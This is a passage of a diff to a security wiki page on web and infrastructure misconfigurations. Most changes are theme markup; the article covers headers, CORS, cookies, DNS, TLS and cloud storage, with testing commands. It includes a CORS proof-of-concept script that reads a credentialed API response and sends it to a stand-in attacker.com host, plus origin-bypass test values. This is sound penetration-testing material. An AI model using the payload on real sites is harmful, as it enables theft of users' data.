@@ -1,39 +1,57 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Security Misconfiguration # Security Misconfiguration is a web and infrastructure vulnerability that arises when systems, applications, or services are deployed with insecure defaults, unnecessary features enabled, or incorrect security settings. This creates easy entry points for attackers to steal data, escalate privileges, or disrupt operations.
-Types of Security Misconfigurations- # 1. HTTP Security Headers Misconfiguration # Missing or weak security headers expose applications to XSS, clickjacking, MIME sniffing, and protocol downgrade attacks.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Security Misconfiguration" />
-<meta property="og:description" content="Security Misconfiguration # Security Misconfiguration is a web and infrastructure vulnerability that arises when systems, applications, or services are deployed with insecure defaults, unnecessary features enabled, or incorrect security settings. This creates easy entry points for attackers to steal data, escalate privileges, or disrupt operations.
-Types of Security Misconfigurations- # 1. HTTP Security Headers Misconfiguration # Missing or weak security headers expose applications to XSS, clickjacking, MIME sniffing, and protocol downgrade attacks." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Security Misconfiguration | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Security Misconfiguration# Security Misconfiguration is a web and infrastructure vulnerability that arises when systems, applications, or services are deployed with insecure defaults, unnecessary features enabled, or incorrect security settings. This creates easy entry points for attackers to steal data, escalate privileges, or disrupt operations.
+Types of Security Misconfigurations-# 1. HTTP Security Headers Misconfiguration# Missing or weak security headers expose applications to XSS, clickjacking, MIME sniffing, and protocol downgrade attacks. Headers tell the browser how to handle requests and responses.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Security Misconfiguration">
+	<meta property="og:description" content="Security Misconfiguration# Security Misconfiguration is a web and infrastructure vulnerability that arises when systems, applications, or services are deployed with insecure defaults, unnecessary features enabled, or incorrect security settings. This creates easy entry points for attackers to steal data, escalate privileges, or disrupt operations.
+Types of Security Misconfigurations-# 1. HTTP Security Headers Misconfiguration# Missing or weak security headers expose applications to XSS, clickjacking, MIME sniffing, and protocol downgrade attacks. Headers tell the browser how to handle requests and responses.">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Security Misconfiguration">
+	<meta itemprop="description" content="Security Misconfiguration# Security Misconfiguration is a web and infrastructure vulnerability that arises when systems, applications, or services are deployed with insecure defaults, unnecessary features enabled, or incorrect security settings. This creates easy entry points for attackers to steal data, escalate privileges, or disrupt operations.
+Types of Security Misconfigurations-# 1. HTTP Security Headers Misconfiguration# Missing or weak security headers expose applications to XSS, clickjacking, MIME sniffing, and protocol downgrade attacks. Headers tell the browser how to handle requests and responses.">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="3234">
+
+<title>Security Misconfiguration • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +59,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +78,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +92,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +109,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +196,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +244,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +999,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1021,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1043,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1065,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1087,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1122,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1144,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1166,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1188,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1202,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Security Misconfiguration</strong>
+  <h3>Security Misconfiguration</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1314,19 +1312,10 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="security-misconfiguration">
-  Security Misconfiguration
-  <a class="anchor" href="#security-misconfiguration">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="security-misconfiguration">Security Misconfiguration<a class="anchor" href="#security-misconfiguration">#</a></h1>
 <p>Security Misconfiguration is a web and infrastructure vulnerability that arises when systems, applications, or services are deployed with insecure defaults, unnecessary features enabled, or incorrect security settings. This creates easy entry points for attackers to steal data, escalate privileges, or disrupt operations.</p>
-<h2 id="types-of-security-misconfigurations-">
-  Types of Security Misconfigurations-
-  <a class="anchor" href="#types-of-security-misconfigurations-">#</a>
-</h2>
-<h3 id="1-http-security-headers-misconfiguration">
-  1. HTTP Security Headers Misconfiguration
-  <a class="anchor" href="#1-http-security-headers-misconfiguration">#</a>
-</h3>
+<h2 id="types-of-security-misconfigurations-">Types of Security Misconfigurations-<a class="anchor" href="#types-of-security-misconfigurations-">#</a></h2>
+<h3 id="1-http-security-headers-misconfiguration">1. HTTP Security Headers Misconfiguration<a class="anchor" href="#1-http-security-headers-misconfiguration">#</a></h3>
 <p>Missing or weak security headers expose applications to XSS, clickjacking, MIME sniffing, and protocol downgrade attacks. Headers tell the browser how to handle requests and responses.</p>
 <ul>
 <li><strong>HSTS (Strict-Transport-Security):</strong> Forces HTTPS; missing header allows MITM and downgrade</li>
@@ -1336,20 +1325,14 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>Referrer-Policy:</strong> Controls referrer leakage; misconfigured can expose sensitive URLs</li>
 <li><strong>Permissions-Policy:</strong> Limits browser features; broad settings expand attack surface</li>
 </ul>
-<h3 id="2-cors-cross-origin-resource-sharing-misconfiguration">
-  2. CORS (Cross-Origin Resource Sharing) Misconfiguration
-  <a class="anchor" href="#2-cors-cross-origin-resource-sharing-misconfiguration">#</a>
-</h3>
+<h3 id="2-cors-cross-origin-resource-sharing-misconfiguration">2. CORS (Cross-Origin Resource Sharing) Misconfiguration<a class="anchor" href="#2-cors-cross-origin-resource-sharing-misconfiguration">#</a></h3>
 <p>CORS controls which domains can access resources cross-origin. Misconfigurations let attackers read sensitive data or perform actions on behalf of users.</p>
 <ul>
 <li><strong>Origin reflection:</strong> Server echoes any <code>Origin</code> in <code>Access-Control-Allow-Origin</code></li>
 <li><strong>Credentials + reflected origin:</strong> <code>Access-Control-Allow-Credentials: true</code> with a reflected/attacker-controllable origin (or <code>null</code>). Note: browsers reject <code>Access-Control-Allow-Origin: *</code> together with credentials — a literal wildcard is <em>not</em> exploitable here, so the risk is origin reflection</li>
 <li><strong>Subdomain trust:</strong> <code>.example.com</code> allows any subdomain; exploitable via subdomain takeover</li>
 </ul>
-<h3 id="3-cookie-security-misconfiguration">
-  3. Cookie Security Misconfiguration
-  <a class="anchor" href="#3-cookie-security-misconfiguration">#</a>
-</h3>
+<h3 id="3-cookie-security-misconfiguration">3. Cookie Security Misconfiguration<a class="anchor" href="#3-cookie-security-misconfiguration">#</a></h3>
 <p>Session and auth cookies without proper flags can be stolen via XSS or transmitted over HTTP.</p>
 <ul>
 <li><strong>Missing HttpOnly:</strong> JavaScript can read cookies → XSS-based theft</li>
@@ -1357,10 +1340,7 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>SameSite=None (or too permissive):</strong> Cookies sent on cross-site requests → CSRF. Note: a <em>missing</em> attribute now defaults to <code>Lax</code> in modern browsers (still sent on top-level cross-site GET navigations; older/edge clients may send it on all requests), so <code>SameSite=None</code> is the setting to flag</li>
 <li><strong>Broad Domain scope:</strong> <code>domain=.example.com</code> exposes cookies to subdomains</li>
 </ul>
-<h3 id="4-email-server-misconfiguration-spf-dkim-dmarc">
-  4. Email Server Misconfiguration (SPF, DKIM, DMARC)
-  <a class="anchor" href="#4-email-server-misconfiguration-spf-dkim-dmarc">#</a>
-</h3>
+<h3 id="4-email-server-misconfiguration-spf-dkim-dmarc">4. Email Server Misconfiguration (SPF, DKIM, DMARC)<a class="anchor" href="#4-email-server-misconfiguration-spf-dkim-dmarc">#</a></h3>
 <p>Weak or missing email authentication allows spoofing, phishing, and business email compromise.</p>
 <ul>
 <li><strong>Missing SPF:</strong> Any server can send mail as your domain</li>
@@ -1369,19 +1349,13 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>Missing DMARC or p=none:</strong> No enforcement; spoofed mail can reach inbox</li>
 <li><strong>Misaligned DMARC:</strong> SPF/DKIM domains don’t align with From domain</li>
 </ul>
-<h3 id="5-dns-misconfiguration">
-  5. DNS Misconfiguration
-  <a class="anchor" href="#5-dns-misconfiguration">#</a>
-</h3>
+<h3 id="5-dns-misconfiguration">5. DNS Misconfiguration<a class="anchor" href="#5-dns-misconfiguration">#</a></h3>
 <ul>
 <li><strong>Missing CAA records:</strong> Any CA can issue certs for the domain</li>
 <li><strong>Zone transfer (AXFR) allowed:</strong> Entire DNS zone downloadable → subdomains, IPs, internal hosts exposed</li>
 <li><strong>Open resolvers:</strong> Can be abused for amplification attacks</li>
 </ul>
-<h3 id="6-tlsssl-misconfiguration">
-  6. TLS/SSL Misconfiguration
-  <a class="anchor" href="#6-tlsssl-misconfiguration">#</a>
-</h3>
+<h3 id="6-tlsssl-misconfiguration">6. TLS/SSL Misconfiguration<a class="anchor" href="#6-tlsssl-misconfiguration">#</a></h3>
 <p>Weak ciphers, outdated protocols, or invalid certificates enable MITM, downgrade, and decryption.</p>
 <ul>
 <li><strong>SSLv2/SSLv3 or TLS 1.0/1.1:</strong> Deprecated and vulnerable</li>
@@ -1389,10 +1363,7 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>Certificate issues:</strong> Expired, self-signed, wrong hostname, weak key</li>
 <li><strong>No OCSP stapling:</strong> Slower revocation checks</li>
 </ul>
-<h3 id="7-web-server--application-configuration">
-  7. Web Server &amp; Application Configuration
-  <a class="anchor" href="#7-web-server--application-configuration">#</a>
-</h3>
+<h3 id="7-web-server--application-configuration">7. Web Server &amp; Application Configuration<a class="anchor" href="#7-web-server--application-configuration">#</a></h3>
 <ul>
 <li><strong>Directory listing enabled:</strong> Exposes files and paths</li>
 <li><strong>Default/sample pages:</strong> Leak server type, version, path</li>
@@ -1401,33 +1372,21 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>Default credentials:</strong> Admin or service accounts unchanged</li>
 <li><strong>Backup files exposed:</strong> <code>.bak</code>, <code>.old</code>, <code>.swp</code>, <code>config.json</code> in web root</li>
 </ul>
-<h3 id="8-outdated-components">
-  8. OutDated Components
-  <a class="anchor" href="#8-outdated-components">#</a>
-</h3>
+<h3 id="8-outdated-components">8. OutDated Components<a class="anchor" href="#8-outdated-components">#</a></h3>
 <p>Libraries, frameworks, and plugins with known CVEs (e.g., jQuery, Angular, log4j) are easy targets for automated exploitation. Track versions via response headers, HTML comments, JS file names, and dependency manifests.</p>
 <p><strong>Tools:</strong> retire.js, Wappalyzer , Nuclei (CVE templates)</p>
-<h3 id="9-cloud-storage-misconfiguration">
-  9. Cloud Storage Misconfiguration
-  <a class="anchor" href="#9-cloud-storage-misconfiguration">#</a>
-</h3>
+<h3 id="9-cloud-storage-misconfiguration">9. Cloud Storage Misconfiguration<a class="anchor" href="#9-cloud-storage-misconfiguration">#</a></h3>
 <ul>
 <li><strong>Public S3/Azure/GCP buckets:</strong> Unintended public read/write</li>
 <li><strong>Overly permissive IAM:</strong> Excessive access to storage or APIs</li>
 </ul>
-<h3 id="10-api--access-control-misconfiguration">
-  10. API &amp; Access Control Misconfiguration
-  <a class="anchor" href="#10-api--access-control-misconfiguration">#</a>
-</h3>
+<h3 id="10-api--access-control-misconfiguration">10. API &amp; Access Control Misconfiguration<a class="anchor" href="#10-api--access-control-misconfiguration">#</a></h3>
 <ul>
 <li><strong>Unauthenticated endpoints:</strong> Sensitive data without auth</li>
 <li><strong>Exposed admin/management interfaces:</strong> Reachable from internet</li>
 <li><strong>Overly permissive CORS or CORS + credentials</strong> on APIs</li>
 </ul>
-<h2 id="attack-surfaces">
-  Attack Surfaces
-  <a class="anchor" href="#attack-surfaces">#</a>
-</h2>
+<h2 id="attack-surfaces">Attack Surfaces<a class="anchor" href="#attack-surfaces">#</a></h2>
 <ul>
 <li><strong>Web Layer:</strong> HTTP headers, cookies, CORS, CSP, session management</li>
 <li><strong>Server Layer:</strong> Nginx, Apache, IIS, Tomcat defaults, directory listing, HTTP methods</li>
@@ -1438,27 +1397,16 @@ https://github.com/alex-shpak/hugo-book
 <li><strong>Cloud:</strong> S3, Azure Blob, GCP Storage, IAM policies</li>
 <li><strong>APIs:</strong> Unprotected endpoints, excessive CORS trust</li>
 </ul>
-<h2 id="exploitation-and-bypassing-defenses">
-  Exploitation and Bypassing Defenses
-  <a class="anchor" href="#exploitation-and-bypassing-defenses">#</a>
-</h2>
-<h3 id="1-http-security-headers">
-  1. HTTP Security Headers
-  <a class="anchor" href="#1-http-security-headers">#</a>
-</h3>
+<h2 id="exploitation-and-bypassing-defenses">Exploitation and Bypassing Defenses<a class="anchor" href="#exploitation-and-bypassing-defenses">#</a></h2>
+<h3 id="1-http-security-headers">1. HTTP Security Headers<a class="anchor" href="#1-http-security-headers">#</a></h3>
 <p><strong>What to test:</strong> Presence and correctness of HSTS, X-Frame-Options, CSP, X-Content-Type-Options, Referrer-Policy, Permissions-Policy.</p>
 <p><strong>Manual:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -I https://target.com
-</span></span><span style="display:flex;"><span>curl -s -D - https://target.com -o /dev/null
-</span></span></code></pre></div><p><strong>Tools:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nuclei</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -I https://target.com
+</span></span><span style="display:flex;"><span>curl -s -D - https://target.com -o /dev/null</span></span></code></pre></div><p><strong>Tools:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nuclei</span>
 </span></span><span style="display:flex;"><span>nuclei -u https://target.com -tags misconfig,headers
-</span></span><span style="display:flex;"><span>nuclei -u https://target.com -t http/misconfiguration/
-</span></span></code></pre></div><p><strong>Common findings:</strong> Missing HSTS, weak CSP (e.g. <code>unsafe-inline</code>), missing X-Frame-Options.</p>
-<h3 id="2-cors-misconfiguration">
-  2. CORS Misconfiguration
-  <a class="anchor" href="#2-cors-misconfiguration">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>nuclei -u https://target.com -t http/misconfiguration/</span></span></code></pre></div><p><strong>Common findings:</strong> Missing HSTS, weak CSP (e.g. <code>unsafe-inline</code>), missing X-Frame-Options.</p>
+<h3 id="2-cors-misconfiguration">2. CORS Misconfiguration<a class="anchor" href="#2-cors-misconfiguration">#</a></h3>
 <p><strong>What to test:</strong> Origin reflection, credential handling, subdomain trust.</p>
 <p><strong>Manual (Burp Repeater):</strong></p>
 <ol>
@@ -1466,11 +1414,10 @@ https://github.com/alex-shpak/hugo-book
 <li>If response has <code>Access-Control-Allow-Origin: https://evil.com</code> and <code>Access-Control-Allow-Credentials: true</code> → vulnerable</li>
 </ol>
 <p><strong>POC (reflect origin + credentials):</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://target.com/api/sensitive&#39;</span>, {<span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;include&#39;</span>})
 </span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span>=&gt;<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">d</span>=&gt;document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://attacker.com/?data=&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">d</span>));
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><p><strong>Origin bypass tests:</strong></p>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><p><strong>Origin bypass tests:</strong></p>
 <ul>
 <li><code>Origin: null</code> (some servers allow null)</li>
 <li><code>Origin: target.com.evil.com</code> (subdomain confusion)</li>
@@ -1479,10 +1426,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Double encoding or special chars in Origin</li>
 </ul>
 <p><strong>Tools:</strong> Burp Suite, OWASP ZAP, custom scripts.</p>
-<h3 id="3-cookie-attributes">
-  3. Cookie Attributes
-  <a class="anchor" href="#3-cookie-attributes">#</a>
-</h3>
+<h3 id="3-cookie-attributes">3. Cookie Attributes<a class="anchor" href="#3-cookie-attributes">#</a></h3>
 <p><strong>What to test:</strong> HttpOnly, Secure, SameSite on session and auth cookies.</p>
 <p><strong>Manual:</strong> Inspect <code>Set-Cookie</code> in browser DevTools or proxy. Look for:</p>
 <ul>
@@ -1491,57 +1435,39 @@ https://github.com/alex-shpak/hugo-book
 <li><code>SameSite=None</code> without <code>Secure</code>, or broad <code>Domain</code></li>
 </ul>
 <p><strong>Tool:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -I -s https://target.com | grep -i set-cookie
-</span></span></code></pre></div><h3 id="4-email-spf-dkim-dmarc">
-  4. Email (SPF, DKIM, DMARC)
-  <a class="anchor" href="#4-email-spf-dkim-dmarc">#</a>
-</h3>
